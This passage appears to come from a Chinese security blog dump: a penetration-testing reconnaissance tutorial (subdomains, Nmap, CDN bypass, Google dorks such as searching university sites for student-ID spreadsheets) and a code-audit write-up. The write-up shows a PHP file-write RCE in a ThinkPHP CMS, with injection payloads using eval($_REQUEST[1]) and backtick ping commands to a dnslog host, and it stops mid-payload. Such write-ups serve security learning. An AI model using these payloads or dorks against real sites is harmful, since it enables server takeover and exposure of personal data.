src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318014509-9d1e0079-2f8c-4a3a-9909-b37ee5990d6a.png#align=left&display=inline&height=118&margin=%5Bobject%20Object%5D&originHeight=459&originWidth=1615&status=done&style=none&width=415\"><br>在线二级域名子域名查询<br><a href=\"http://tools.bugscaner.com/subdomain/\">http://tools.bugscaner.com/subdomain/</a><br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318014754-47fa1d03-4d3c-488e-9bc5-823769f28d5a.png#align=left&display=inline&height=196&margin=%5Bobject%20Object%5D&originHeight=727&originWidth=1541&status=done&style=none&width=416\"></p>\n<h6 id=\"4-Burp的Spider模块\"><a href=\"#4-Burp的Spider模块\" class=\"headerlink\" title=\"4.Burp的Spider模块\"></a>4.Burp的Spider模块</h6><p>首先要先捕获到主域名的数据包<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318015002-6bb5d9cf-783c-446c-85fd-60e2c8f4bcf3.png#align=left&display=inline&height=276&margin=%5Bobject%20Object%5D&originHeight=838&originWidth=1262&status=done&style=none&width=415\"><br>右键send to Spider<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318015253-75033e01-6639-4e33-9f04-a47e86e51c3f.png#align=left&display=inline&height=276&margin=%5Bobject%20Object%5D&originHeight=838&originWidth=1262&status=done&style=none&width=415\"><br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318015499-4bd67a81-244c-425a-929f-dd1bc5b6e968.png#align=left&display=inline&height=276&margin=%5Bobject%20Object%5D&originHeight=838&originWidth=1262&status=done&style=none&width=415\"><br>在target模块便可以看到很多百度的子域名，而且burp的好处是不仅仅查询子域名，还能够查询到站点地图，这在很大程度上帮助我们了解了网站的具体框架结构，为后续的渗透测试奠定基础。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318015717-513eea50-902a-4bdc-b1c0-0c3b1d3cebf8.png#align=left&display=inline&height=276&margin=%5Bobject%20Object%5D&originHeight=838&originWidth=1262&status=done&style=none&width=415\"><br>总而言之，收集子域名的方法还有很多，我比较喜欢用的就是layer子域名挖掘机和burp，当然还有很多在线工具可以通过百度子域名获取到。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318016022-e11516a3-b4f0-428c-8198-ca2c8cc7a76a.png#align=left&display=inline&height=253&margin=%5Bobject%20Object%5D&originHeight=839&originWidth=1381&status=done&style=none&width=416\"></p>\n<h1 id=\"3-端口扫描\"><a href=\"#3-端口扫描\" class=\"headerlink\" title=\"3.端口扫描\"></a>3.端口扫描</h1><h6 id=\"Nmap\"><a href=\"#Nmap\" class=\"headerlink\" title=\"Nmap\"></a>Nmap</h6><p>说到端口扫描就马上可以想到kali Linux这个网络安全人员所熟知的系统。在kali系统里面集成了很多渗透测试的工具，其中有一款叫<strong>Nmap</strong>的工具，可以通过相应语法对目标主机进行端口扫描，得到目标主机的端口开放情况信息。有些危险端口开放了我们就可以尝试入侵，例如445|3306|22|1433|6379 可以尝试爆破或者是使用某些端口存在漏洞的服务。而且有可能一台服务器上面不同端口代表着不同的Web网站。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/jpeg/12366538/1612318016319-d7d1ce62-3b0c-4b38-8c8f-68a533fcbdcf.jpeg#align=left&display=inline&height=320&margin=%5Bobject%20Object%5D&originHeight=831&originWidth=1080&status=done&style=none&width=416\"><br>基础命令<br>-p  指定端口扫描<br>-v    显示扫描过程<br>-Pn 跳过主机发现过程直接端口扫描 [目标禁ping时使用]<br>-O   探测主机操作系统<br>-A   全面扫描，包括一切探测，由于动静太大而且时间问题不怎么使用</p>\n<p>端口扫描状态<br>Opend 端口开放<br>Closed 端口关闭<br>Filtered 端口被过滤</p>\n<h6 id=\"在线网站\"><a href=\"#在线网站\" class=\"headerlink\" title=\"在线网站\"></a>在线网站</h6><p>站长之家(因为要防止恶意攻击，所以只能单个端口测试)<br><a href=\"https://tool.chinaz.com/port/\">https://tool.chinaz.com/port/</a><br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318016520-ce55aeb8-c365-44d1-b2cf-b2ea74ae5b3f.png#align=left&display=inline&height=128&margin=%5Bobject%20Object%5D&originHeight=466&originWidth=1518&status=done&style=none&width=416\"><br>PostJson在线端口检测<br><a href=\"http://coolaf.com/tool/port\">http://coolaf.com/tool/port</a><br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318016801-603296e2-91f9-4e25-a719-994febd4fb4d.png#align=left&display=inline&height=191&margin=%5Bobject%20Object%5D&originHeight=786&originWidth=1704&status=done&style=none&width=415\"></p>\n<h1 id=\"4-目录扫描\"><a href=\"#4-目录扫描\" class=\"headerlink\" title=\"4.目录扫描\"></a>4.目录扫描</h1><p>目录是什么，目录就是一个网站的骨架，正如我们平时访问一个网站，先是进入了主目录，或者说访问了index.php/index.html等index文件，但是我们不知道目标网站还有哪些目录文件是我们可以访问的，所以就需要进行目录扫描了。下面介绍如何进行目录扫描。</p>\n<h6 id=\"御剑目录扫描工具\"><a href=\"#御剑目录扫描工具\" class=\"headerlink\" title=\"御剑目录扫描工具\"></a>御剑目录扫描工具</h6><p>御剑是一款能够通过字典对目标域名进行轮询访问，检测http状态码的软件，如果得到200回应就记录下来，也就得到了我们需要的目录信息。<br>这里随便扫了一个靶场，可以看到网站目录除了index.php之外还有一个robosts文件。robots.txt是一个基本上在每个网站中都会放置的文件，里面会标明了哪些目录可以爬取，哪些不可以爬取，当然这往往只是君子协议，真的爬取了也是无法拦截的。渗透测试过程中往往可以通过访问robots文件查看一些敏感目录。</p>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318017024-3f6d7017-9bb4-4ed6-b7b5-cfa57d7784b6.png#align=left&display=inline&height=189&margin=%5Bobject%20Object%5D&originHeight=422&originWidth=929&status=done&style=none&width=415\"><br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318017250-f2829b8b-9724-4f35-8b6f-34435020bdfa.png#align=left&display=inline&height=112&margin=%5Bobject%20Object%5D&originHeight=191&originWidth=706&status=done&style=none&width=415\"></p>\n<h1 id=\"5-C段\"><a href=\"#5-C段\" class=\"headerlink\" title=\"5.C段\"></a>5.C段</h1><p>C段，即IP地址的C段地址，如192.168.1.0/24。在渗透测试过程中，一个公司可能由于业务原因，会购买多个公网IP，那么为了方便，这些IP往往是相连的，甚至该公司会直接将那个公网IP的一个C段买下来。也就是说，测试站点所处的IP地址的C段，很可能也是该公司的资产，在渗透测试过程中可以通过迂回战术，先拿下C段的该公司的其他站点，再来对主站点进行渗透测试。<br>       要获取C段就涉及了一个内容——CDN，内容分发网络，是为了负载均衡，内容分发等而创建的一个智能虚拟网络。对于一些大公司来说，他的业务可能会有非常多以至于全世界都有人访问，那么一台服务器是不足以完成那么大的工作量的，这时候就需要购买CDN了，对于不同区域的用户分发不同的IP地址，里面存储了需要访问的资源，能够很大程度上减轻服务器的压力。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318017568-5c04002e-c8b5-4e82-ba3d-7abd035154a3.png#align=left&display=inline&height=161&margin=%5Bobject%20Object%5D&originHeight=640&originWidth=1653&status=done&style=none&width=415\"><br>       有了CDN的存在也就是说，我们通过ping域名的方式获取的IP地址不一定是真实IP地址，所以我们就需要绕过CDN来获取真实IP地址进而获取C段。 下面介绍如何判断是否有CDN以及如何获取真实IP。</p>\n<h2 id=\"判断是否有CDN\"><a href=\"#判断是否有CDN\" class=\"headerlink\" title=\"判断是否有CDN\"></a>判断是否有CDN</h2><p>有一个在线工具叫多地点Ping，可以通过不同地点ping域名的对应IP是否相同来判断有没有CDN服务。<br><a href=\"https://www.ping.cn/ping/\">https://www.ping.cn/ping/</a><br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318018031-574a3b07-13e2-43a7-ab42-68fc29bfe3b9.png#align=left&display=inline&height=201&margin=%5Bobject%20Object%5D&originHeight=827&originWidth=1710&status=done&style=none&width=416\"><br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318018340-373bc336-a54f-4277-b598-d393df18b9f5.png#align=left&display=inline&height=204&margin=%5Bobject%20Object%5D&originHeight=808&originWidth=1756&status=done&style=none&width=444\"><br>这里我测试的是baidu.com，很明显不同地区的IP不同，所以存在CDN。</p>\n<h2 id=\"绕过CDN获取真实IP\"><a href=\"#绕过CDN获取真实IP\" class=\"headerlink\" title=\"绕过CDN获取真实IP\"></a>绕过CDN获取真实IP</h2><p>1、 子域名查询<br>子域名与主域名同一服务器<br>CDN挂在主域名上，但是不一定挂在子域名上</p>\n<p>2、邮件服务器<br>从邮件服务器请求邮件，邮件中可以获取真实IP</p>\n<p>3、国外地址请求（国外ping）<br>4、遗留文件，扫描全网<br>例如通过phpinfo.php文件中获取IP地址<br>全网ping，从CDN中筛选真实IP</p>\n<p>5、fofa、shodan、zoomeye搜索特定文件/信息<br>6、dns历史记录<br>查询未使用cdn之前留下的真实IP记录</p>\n<h1 id=\"6-旁站\"><a href=\"#6-旁站\" class=\"headerlink\" title=\"6.旁站\"></a>6.旁站</h1><p>旁站，即同IP不同站点。旁站一般都是和目标站点在同一个内网或者是同一台服务器。在渗透测试过程中为了加大攻击面，往往还会获取目标的旁站，从旁站入手进行渗透测试。下面介绍如何获取旁站，一般都是通过在线工具获取。</p>\n<h6 id=\"站长工具\"><a href=\"#站长工具\" class=\"headerlink\" title=\"站长工具\"></a>站长工具</h6><p><a href=\"http://stool.chinaz.com/same\">http://stool.chinaz.com/same</a><br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318018532-9a0319b4-0f54-48e3-adc2-2d29d669163a.png#align=left&display=inline&height=240&margin=%5Bobject%20Object%5D&originHeight=881&originWidth=1525&status=done&style=none&width=415\"></p>\n<h6 id=\"The-Web-of-WebScan\"><a href=\"#The-Web-of-WebScan\" class=\"headerlink\" title=\"The Web of WebScan\"></a>The Web of WebScan</h6><p>       <a href=\"https://www.webscan.cc/\">https://www.webscan.cc/</a><br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318018886-df5563b1-1301-4226-b344-36b4f314564e.png#align=left&display=inline&height=217&margin=%5Bobject%20Object%5D&originHeight=851&originWidth=1630&status=done&style=none&width=416\"></p>\n<h1 id=\"7-指纹识别\"><a href=\"#7-指纹识别\" class=\"headerlink\" title=\"7.指纹识别\"></a>7.指纹识别</h1><p>       指纹识别，也就是通过指纹信息判断当前系统的环境配置、使用的CMS等。说到指纹我们都不陌生了，手机就有指纹解锁。我们可以通过指纹信息判断一个人的身份，是否为当前手机的机主。渗透测试中的指纹识别也差不多，通过识别目标网站是否使用CMS模板搭建，使用了什么框架等，可以让我们能够针对性的对其进行渗透。<br>       CMS，内容管理系统。即一套web系统的模板，我们可以通过CMS快速搭建一个网站，这种模板的代码一般开源，在网上也有很多旧版本的漏洞。通过识别是什么CMS，我们就可以搜索该CMS的历史漏洞，即Nday，测试是否有修复。<br>       指纹识别一般通过下面几种在线工具进行识别。</p>\n<h6 id=\"Whatweb在线指纹识别\"><a href=\"#Whatweb在线指纹识别\" class=\"headerlink\" title=\"Whatweb在线指纹识别\"></a>Whatweb在线指纹识别</h6><p><a href=\"http://whatweb.bugscaner.com/\">http://whatweb.bugscaner.com/</a><br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318019120-8c399c9b-1803-4b93-b5a9-6d1a8e2797bf.png#align=left&display=inline&height=212&margin=%5Bobject%20Object%5D&originHeight=730&originWidth=1434&status=done&style=none&width=416\"><br>如图我们成功判断出该站点的cms为dedecms，那么就可以通过dedecms的历史漏洞进行渗透测试。</p>\n<h6 id=\"微步社区（tips-只输入域名即可，不需要加上http-）\"><a href=\"#微步社区（tips-只输入域名即可，不需要加上http-）\" class=\"headerlink\" title=\"微步社区（tips:只输入域名即可，不需要加上http://）\"></a>微步社区（tips:只输入域名即可，不需要加上http://）</h6><p><a href=\"https://x.threatbook.cn/\">https://x.threatbook.cn/</a><br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318019391-b0d067bd-76ae-4851-94ce-3f628b4040e7.png#align=left&display=inline&height=187&margin=%5Bobject%20Object%5D&originHeight=797&originWidth=1767&status=done&style=none&width=415\"><br>微步社区不怎么用，还是以查询威胁情报为主的，这里看到可以查询到域名解析、子域名、whois等信息。</p>\n<h6 id=\"云溪指纹（需要邀请码，需要注册，还挺麻烦的）\"><a href=\"#云溪指纹（需要邀请码，需要注册，还挺麻烦的）\" class=\"headerlink\" title=\"云溪指纹（需要邀请码，需要注册，还挺麻烦的）\"></a>云溪指纹（需要邀请码，需要注册，还挺麻烦的）</h6><p><a href=\"https://www.yunsee.cn/\">https://www.yunsee.cn/</a><br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318019653-f806593e-20f9-44c0-8c03-8f8c288528e2.png#align=left&display=inline&height=200&margin=%5Bobject%20Object%5D&originHeight=813&originWidth=1687&status=done&style=none&width=415\"><br>可以看到云溪指纹查询的信息就很全面，然后还提供了查看漏洞功能，所以个人是很喜欢使用云溪指纹识别的。</p>\n<h1 id=\"8-内容敏感信息泄露-（google-hacking）\"><a href=\"#8-内容敏感信息泄露-（google-hacking）\" class=\"headerlink\" title=\"8. 内容敏感信息泄露 （google hacking）\"></a>8. 内容敏感信息泄露 （google hacking）</h1><h6 id=\"Google搜索引擎\"><a href=\"#Google搜索引擎\" class=\"headerlink\" title=\"Google搜索引擎\"></a>Google搜索引擎</h6><p>Google是一款十分强大的搜索引擎，黑客们常常借助它搜索网站的一些敏感目录和文件，甚至可以利用它的搜索功能来自动攻击那些有漏洞的网站；而有些人可以通过搜索把某个个人的信息，包括住址、电话号码、出生年月等都可以搜索出来；当然我们在日常的生活中正确的借助Google搜索也可以更加高效的找到我们需要的东西。也就是说我们通过谷歌搜索引擎，加上google语法，能够收集到一些敏感信息。</p>\n<h6 id=\"Google镜像站\"><a href=\"#Google镜像站\" class=\"headerlink\" title=\"Google镜像站\"></a>Google镜像站</h6><p>我们都知道，国内是无法访问google搜索引擎的，虽然其他搜索引擎也是可以使用google语法的，但是会过滤掉一些信息，用起来很不方便，所以还是推荐使用谷歌。<br>有一款工具叫<strong>谷歌镜像站</strong>，是国人搭建的类似google搜索引擎的网站，可以达到类似google的效果。谷歌镜像站可以通过百度获得。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318019936-1bd50b23-7b3c-4a70-aa96-658e0335aca6.png#align=left&display=inline&height=298&margin=%5Bobject%20Object%5D&originHeight=715&originWidth=995&status=done&style=none&width=415\"></p>\n<h6 id=\"Google语法\"><a href=\"#Google语法\" class=\"headerlink\" title=\"Google语法\"></a>Google语法</h6><p>1.site<br>site:edu.cn //搜索该域名下的所有站点，包括子域名<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318020203-b6a9c5f9-0501-4077-8730-96ea362b3292.png#align=left&display=inline&height=355&margin=%5Bobject%20Object%5D&originHeight=868&originWidth=1016&status=done&style=none&width=416\"><br>2.inurl<br>搜索域名中与关键字匹配的页面<br>常用的有<br>inurl:php?id= //查询域名中带有php?id=的页面<br>inurl:admin.php //查询域名中带有admin.php的页面，多用于查询后台<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318020523-4b20c405-75d4-40d8-a820-4ec187a5ab43.png#align=left&display=inline&height=354&margin=%5Bobject%20Object%5D&originHeight=859&originWidth=1008&status=done&style=none&width=415\"><br>3.intitle<br>搜索网页中的标题内容与关键字匹配的页面<br>intitle:后台管理 //查询网页标题含有后台管理的页面<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318020892-9b3a08b4-41fd-47b9-9754-1b31090ff1a1.png#align=left&display=inline&height=370&margin=%5Bobject%20Object%5D&originHeight=862&originWidth=966&status=done&style=none&width=415\"><br>4.intext<br>搜索网页内容与关键字匹配的页面<br>intext:dedecms //查询网页内容含有dedecms的页面<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318021172-54b43fd9-0539-45f9-991c-a972cdf7a329.png#align=left&display=inline&height=363&margin=%5Bobject%20Object%5D&originHeight=877&originWidth=1004&status=done&style=none&width=416\"><br>5.filetype<br>搜索文件类型与关键字匹配的文件<br>filetype:xls //查询excel文件<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318021378-a16c3394-66ad-4e74-a6e0-c35950d33e3c.png#align=left&display=inline&height=259&margin=%5Bobject%20Object%5D&originHeight=860&originWidth=1379&status=done&style=none&width=415\"></p>\n<h6 id=\"内容敏感信息泄露\"><a href=\"#内容敏感信息泄露\" class=\"headerlink\" title=\"内容敏感信息泄露\"></a>内容敏感信息泄露</h6><p>1、搜索高校存在学号字眼的excel文件，用来获取学号信息<br>语法：filetype:xls site:edu.cn 学号<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318021636-76854a1d-d7e8-4ff2-b3bb-bdcc3c447153.png#align=left&display=inline&height=258&margin=%5Bobject%20Object%5D&originHeight=823&originWidth=1325&status=done&style=none&width=415\"><br>2、搜索高校域名中存在php?id=的页面，尝试测试是否存在SQL注入<br>语法：site:edu.cn inurl:php?id=<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318021928-cbde4c02-b00f-47b6-b4fa-ca9ca587e9d0.png#align=left&display=inline&height=321&margin=%5Bobject%20Object%5D&originHeight=793&originWidth=1025&status=done&style=none&width=415\"><br>3、搜索高校的后台登录页面<br>语法：site:edu.cn intitle:后台登录</p>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318022137-beeab898-94ca-4ed8-b7fc-4f93370d57f5.png#align=left&display=inline&height=358&margin=%5Bobject%20Object%5D&originHeight=870&originWidth=1011&status=done&style=none&width=416\"></p>\n"},{"title":"某cms代码审计RCE&艰难bypass(思路清奇)","keywords":"cms,代码审计,bypass,php","description":"对某cms进行一次代码审计bypass","cover":"https://img0.baidu.com/it/u=751296986,1439230770&fm=253&fmt=auto&app=120&f=JPEG?w=650&h=407","data":"2021-08-05T02:00:00.000Z","_content":"\n<meta name=\"referrer\" content=\"no-referrer\"/>\n\n> 本文已发布到先知社区：https://xz.aliyun.com/t/9990\n>\n> 作者：ajie\n\n# 0x01 前言\n\n闲来无事挖挖漏洞，发现一个经过了一些过滤的漏洞，踩了无数的坑，然后冥思苦想了许多方法，终于找到了一个点，使得可以进行命令执行与getshell。这里的漏洞点不值一提，但是因为绕过方法挺好玩的，故在这里分享一下思路，大佬勿喷～\n思路不唯一，也希望有其他方法的话，大佬们可以不吝赐教，在评论区留下具体方法，谢谢大家～\n# 0x02 代码审计环境\n此次代码审计采用的是phpstudy一键式搭建。\nphpstudy下载地址：[https://www.xp.cn/download.html](https://www.xp.cn/download.html)\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627971325439-22769cc2-8d3c-41a2-8185-4678214b0b6b.png)\n代码审计分析工具：nopad++，seay源代码分析工具\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627971466153-651305cf-f199-4ad4-86c8-9599bda20d95.png#align=left&display=inline&height=486&margin=%5Bobject%2Object%5D&name=image.png&originHeight=972&originWidth=2022&size=139166&status=done&style=none&width=1011)\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627971389181-eb803d39-5a81-48d8-ac70-ffc28257b6da.png#align=left&display=inline&height=571&margin=%5Bobject%2Object%5D&name=image.png&originHeight=1142&originWidth=2388&size=356754&status=done&style=none&width=1194)\n\n# 0x03 开始审计\n话不多说，先看一下目录结构，很明显的tp5框架\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627972430124-8e7c7656-9fa6-4359-a4e3-6543904ec4ce.png#align=left&display=inline&height=281&margin=%5Bobject%2Object%5D&name=image.png&originHeight=562&originWidth=956&size=48969&status=done&style=none&width=478)\n在\\thinkphp\\base.php文件中也可以看到对应的tp版本号（5.0.24版本好像有个反序列化，其实也可以尝试一下）\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627972568248-ebb5d28f-a552-4570-92f2-57121b18ba68.png#align=left&display=inline&height=301&margin=%5Bobject%2Object%5D&name=image.png&originHeight=602&originWidth=1238&size=96549&status=done&style=none&width=619)\n虽然seay用现有的规则扫描扫出来的漏洞不太准确，但是帮忙定位危险函数还是可以的，所以我一般都会先进行自动审计。\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627972380570-1f206c81-580c-4d1c-bd47-71132c722f9b.png#align=left&display=inline&height=652&margin=%5Bobject%2Object%5D&name=image.png&originHeight=1304&originWidth=2424&size=273863&status=done&style=none&width=1212)\n接下来就是一个个漏洞分析了，都点进去看一看。\n其实只需要看2点：\n1.用户可以控制输入的内容\n2.输入的内容被放到危险函数中进行了执行\n(需要进行流程跟进的话还是推荐使用phpstorm工具的，我这里因为是在虚拟机中，就简单用了seay和nopad++代替)\n\n# 0x04 漏洞点分析\n1、具体我发现这个漏洞是在/app/admin/controller/api.php文件下的debug函数\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627972756885-5eac5c3d-6c8e-46ff-9a13-4914400c87c7.png#align=left&display=inline&height=331&margin=%5Bobject%2Object%5D&name=image.png&originHeight=662&originWidth=1360&size=59767&status=done&style=none&width=680)\n```php\npublic function debug()\n    {\n        $path = 'app/extra/debug.php';\n        $file = include $path; \n        $config = array(\n         'name' => input('id'),\n        );\n        $config = preg_replace(\"/[?><?]/\", '', $config);\n        $res = array_merge($file, $config);\n        $str = '<?php return [';\n        foreach ($res as $key => $value) {\n            $str .= '\\'' . $key . '\\'' . '=>' . '\\'' . $value . '\\'' . ',';\n        }\n        $str .= ']; ';\n        if (file_put_contents($path, $str)) {\n            return json(array('code' => 1, 'msg' => '操作成功'));\n        } else {\n            return json(array('code' => 0, 'msg' => '操作失败'));\n        }\n    }\n```\n在代码第15行通过file_put_contents()函数将id传参的内容写入到app/extra/debug.php文件中。\n2、可以看到上面进行了一些过滤，将<>和?替换为空\n```php\n$config = preg_replace(\"/[?><?]/\", '', $config);\n```\n3、这里直接将不太清晰，实战演示一下，首先访问后台路径，这里有个debug功能，就是上面debug函数的功能点。\n[http://127.0.0.1/index.php/admin/](http://127.0.0.1/index.php/admin/)\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627973358124-c7069db1-627c-4b05-8d15-255493426fee.png#align=left&display=inline&height=378&margin=%5Bobject%2Object%5D&name=image.png&originHeight=756&originWidth=2250&size=114711&status=done&style=none&width=1125)\n4、具体使用时发现报错了，那就直接访问对应的函数，路由规则就是/index.php/目录-文件-函数.html?传参=。\n这里我传参123进行测试\n[http://127.0.0.1/index.php/admin-api-debug.html?id=123](http://127.0.0.1/index.php/admin-api-debug.html?id=123)\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627973462857-ae631d20-59ff-4a98-bb1d-6702c09d8311.png#align=left&display=inline&height=227&margin=%5Bobject%2Object%5D&name=image.png&originHeight=454&originWidth=1120&size=27749&status=done&style=none&width=560)\n5、在debug.php文件中可以看到123是放到数组中的值处，而我们可以控制这里的值。\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627973579521-fd2d20ba-4b8c-46b5-9edf-654fb073cfed.png#align=left&display=inline&height=97&margin=%5Bobject%2Object%5D&name=image.png&originHeight=194&originWidth=810&size=11511&status=done&style=none&width=405)\n```php\n<?php return ['name'=>'123',]; \n```\n6、下面讲解我进行绕过的思路以及遇到的坑。\n# 0x05 绕过思路\n## 第一次踩坑\n1、首先，这里因为没有过滤单引号和中括号，所以我们可以手动闭合\n```php\npayload:\nhttp://127.0.0.1/index.php/admin-api-debug.html?id=123%27];phpinfo();//\n```\n这里可以看到数据是成功写入进文件中的\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627973910607-7d1ffe2f-30b8-406c-9ec6-a7f233aa1838.png#align=left&display=inline&height=131&margin=%5Bobject%2Object%5D&name=image.png&originHeight=262&originWidth=1138&size=17735&status=done&style=none&width=569)\n```php\n<?php return ['name'=>'123'];phpinfo();//',]; \n```\n2、访问debug.php文件试试发现，页面并没有返回想要的内容\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627973998766-06dfe807-2a84-4b08-9d12-f6f666c5d553.png#align=left&display=inline&height=363&margin=%5Bobject%2Object%5D&name=image.png&originHeight=726&originWidth=1882&size=36793&status=done&style=none&width=941)\n3、这里我想了好久，想着试试更换echo输出看看\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627974252476-7716d00d-14a0-4716-b201-a544a6f60a7b.png#align=left&display=inline&height=131&margin=%5Bobject%2Object%5D&name=image.png&originHeight=262&originWidth=1216&size=17745&status=done&style=none&width=608)\n```php\n<?php return ['name'=>'123'];echo '12344321';//',]; \n```\n在页面中并没有输出\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627974272002-aae9ec72-7aef-4da2-9334-3b1d52dd1fdc.png#align=left&display=inline&height=349&margin=%5Bobject%2Object%5D&name=image.png&originHeight=698&originWidth=1572&size=32195&status=done&style=none&width=786)\n4、查阅资料之后理解了return后代码不再向下执行，此路不通\n参考链接：[https://www.cnblogs.com/gzpu/p/13736420.html](https://www.cnblogs.com/gzpu/p/13736420.html)\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627974368673-8697062b-c811-4893-8104-93859af43ce4.png#align=left&display=inline&height=360&margin=%5Bobject%2Object%5D&name=image.png&originHeight=720&originWidth=1780&size=173801&status=done&style=none&width=890)\n## 第二次踩坑\n1、既然不能通过分号结束代码后执行其他代码的话，我能不能在return中执行代码呢，此处进行了尝试\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627974559232-6d36dadf-930e-47a1-9480-1ec1a7fedfff.png#align=left&display=inline&height=166&margin=%5Bobject%2Object%5D&name=image.png&originHeight=332&originWidth=1320&size=21063&status=done&style=none&width=660)\n```php\n<?php return ['name'=>'123',eval($_REQUEST[1]);'',]; \n```\n于是……页面报错了\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627974695282-85560a7a-e2ed-420b-a587-3fca009fce13.png#align=left&display=inline&height=208&margin=%5Bobject%2Object%5D&name=image.png&originHeight=416&originWidth=1896&size=51008&status=done&style=none&width=948)\n2、再试试换行\n```php\nhttp://127.0.0.1/index.php/admin-api-debug.html?id=123%27,%0aeval($_REQUEST[1]);%27\n```\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627974633748-97685352-f49d-473f-8a3b-2bee5cd0f9f9.png#align=left&display=inline&height=255&margin=%5Bobject%2Object%5D&name=image.png&originHeight=510&originWidth=1766&size=41682&status=done&style=none&width=883)\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627974665241-8ade3301-0ef4-4c8e-81c7-ed35aaf695d6.png#align=left&display=inline&height=149&margin=%5Bobject%2Object%5D&name=image.png&originHeight=298&originWidth=774&size=17721&status=done&style=none&width=387)\n好的，还是不执行\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627974689654-d9f1edad-993c-47cf-bd87-4a90e81ca765.png#align=left&display=inline&height=208&margin=%5Bobject%2Object%5D&name=image.png&originHeight=416&originWidth=1896&size=51008&status=done&style=none&width=948)\n## 第三次，渐渐好起来了\n1、因为代码执行行不通，那我就想着试试命令执行看可不可以。先申请一个dnslog，链接：[http://dnslog.cn/](http://dnslog.cn/)\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627975381688-d15ad1b7-76f1-415d-bcd7-e22aa5ba1eb6.png#align=left&display=inline&height=368&margin=%5Bobject%2Object%5D&name=image.png&originHeight=736&originWidth=1678&size=96742&status=done&style=none&width=839)\n2、使用.拼接反引号执行命令\n```php\nhttp://127.0.0.1/index.php/admin-api-debug.html?id=123%27].`ping%20123.yh6nta.dnslog.cn`;//\n```\n查看文件情况\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627975963563-5fcf69e0-c0a5-4b5c-a539-91dc15f8ed2b.png#align=left&display=inline&height=130&margin=%5Bobject%2Object%5D&name=image.png&originHeight=260&originWidth=1520&size=21022&status=done&style=none&width=760)\n```php\n<?php return ['name'=>'123'].`ping 123.yh6nta.dnslog.cn`;//',]; \n```\n访问看看，发现报错了，但是dnslog记录了数据，命令执行成功了\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627975999637-a25ee21b-1180-4e35-b011-5cfd6aa1b280.png#align=left&display=inline&height=205&margin=%5Bobject%2Object%5D&name=image.png&originHeight=410&originWidth=1638&size=42918&status=done&style=none&width=819)\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627976022017-93c02bcb-6de0-4975-9a73-97abf75fcd0d.png#align=left&display=inline&height=243&margin=%5Bobject%2Object%5D&name=image.png&originHeight=486&originWidth=1562&size=52679&status=done&style=none&width=781)\n\n\n3、这里报错怀疑是使用了点进行拼接，两边的字符类型不匹配，因为命令执行可以使用符号进行连接，所以在这里将点替换成&。\n因为&在url中还有其他含义，所以先进行url编码。\n```php\n123']&`ping 